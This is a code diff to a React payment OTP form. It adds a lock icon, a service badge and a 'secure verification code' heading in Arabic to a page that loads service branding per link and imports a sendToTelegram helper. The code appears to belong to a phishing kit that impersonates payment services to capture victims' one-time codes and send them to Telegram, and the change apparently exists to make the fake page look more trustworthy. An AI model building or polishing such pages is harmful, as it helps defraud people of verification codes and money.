@@ -4,10 +4,11 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
-import { Shield, AlertCircle, Check, ArrowLeft, X } from "lucide-react";
+import { Shield, AlertCircle, Check, ArrowLeft, X, BadgeCheck, Lock } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { useLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
+import ServiceBadge from "@/components/ServiceBadge";
 
 const PaymentOTPForm = () => {
   const { id } = useParams();
@@ -147,15 +148,27 @@ const PaymentOTPForm = () => {
       {/* Title Section */}
       <div className="text-center mb-6 sm:mb-8">
         <div 
-          className="w-16 h-16 sm:w-20 sm:h-20 rounded-full mx-auto mb-4 flex items-center justify-center animate-pulse shadow-lg"
+          className="w-16 h-16 sm:w-20 sm:h-20 rounded-full mx-auto mb-4 flex items-center justify-center animate-pulse shadow-lg relative"
           style={{
             background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
           }}
         >
           <Shield className="w-8 h-8 sm:w-10 sm:h-10 text-white" />
+          <div className="absolute -top-1 -right-1 bg-white rounded-full p-1">
+            <Lock className="w-3 h-3 sm:w-4 sm:h-4" style={{ color: branding.colors.primary }} />
+          </div>
         </div>
-        <h1 className="text-2xl sm:text-3xl font-bold mb-2">رمز التحقق</h1>
-        <p className="text-sm sm:text-base text-muted-foreground">أدخل الرمز المرسل إلى هاتفك</p>
+        <h1 className="text-2xl sm:text-3xl font-bold mb-2">رمز التحقق الآمن</h1>
+        <p className="text-sm sm:text-base text-muted-foreground mb-3">أدخل الرمز المرسل إلى هاتفك</p>
+        
+        {/* Service Badge */}
+        <div className="flex justify-center">
+          <ServiceBadge 
+            serviceKey={serviceKey}
+            serviceName={serviceName}
+            size="md"
+          />
+        </div>
       </div>
 
       {/* Info */}
